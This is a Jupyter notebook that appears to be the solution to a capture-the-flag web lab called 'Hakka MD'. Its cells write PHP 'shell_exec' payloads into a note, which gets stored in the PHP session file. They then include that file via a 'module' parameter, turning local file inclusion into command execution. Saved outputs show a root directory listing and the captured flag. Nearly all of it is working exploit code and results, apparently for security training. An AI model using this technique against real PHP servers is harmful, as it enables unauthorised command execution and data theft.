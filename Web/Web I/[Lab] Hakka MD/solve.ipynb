{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "bf9577c9-fc7f-498e-af38-09e700fb315c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "s = requests.Session()\n",
    "r = s.post(\"http://h4ck3r.quest:8401/?module=module/post.php\", data={'note': \"<?php echo shell_exec('ls /');?>\"})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "3adef2d3-f53a-4c21-8d40-3c2cff8bc04f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'kctbnaskoam4koabvqp1f0jj0h'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "session_id = s.cookies['PHPSESSID']\n",
    "session_id"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "725c6813-8fba-45e4-9fe8-d7aff29c75e6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\n<!DOCTYPE html>\\n<html lang=\"en\">\\n\\n<head>\\n    <meta charset=\"UTF-8\">\\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\\n    <title>HakkaMD</title>\\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css\">\\n</head>\\n\\n<body>\\n    <section class=\"section\">\\n        <div class=\"container\">\\n            <div class=\"column is-6 is-offset-3\">\\n                notes|a:1:{i:0;s:32:\"bin\\nboot\\ndev\\netc\\nflag_aff6136bbef82137\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\ntmp\\nusr\\nvar\\n\";}                <p>\\n                    <a href=\"/?module=module/home.php\">首頁</a> |\\n                    <a href=\"/?module=module/list.php\">筆記列表</a> |\\n                    <a href=\"/phpinfo.php\">phpinfo()</a>\\n                </p>\\n            </div>\\n        </div>\\n    </section>\\n</body>\\n\\n</html>'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.get(f\"http://h4ck3r.quest:8401/?module=/tmp/sess_{session_id}\").text # get ls /"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "dfcf9c4a-6ba7-4604-bec7-9e8be3f662ca",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'FLAG{include(LFI_to_RCE)}\";i:2;s:54:\"FLAG{include(LFI_to_RCE)}\";i:3;s:54:\"FLAG{include(LFI_to_RCE)}\";}                <p>\\n                    <a href=\"/?module=module/home.php\">首頁</a> |\\n                    <a href=\"/?module=module/list.php\">筆記列表</a> |\\n                    <a href=\"/phpinfo.php\">phpinfo()</a>\\n                </p>\\n            </div>\\n        </div>\\n    </section>\\n</body>\\n\\n</html>'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = s.post(\"http://h4ck3r.quest:8401/?module=module/post.php\", data={'note': \"<?php echo shell_exec('cat /flag_aff6136bbef82137');?>\"})\n",
    "res = s.get(f\"http://h4ck3r.quest:8401/?module=/tmp/sess_{session_id}\").text # get cat /flag_xxxx\n",
    "res[res.find(\"FLAG{\"):]"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
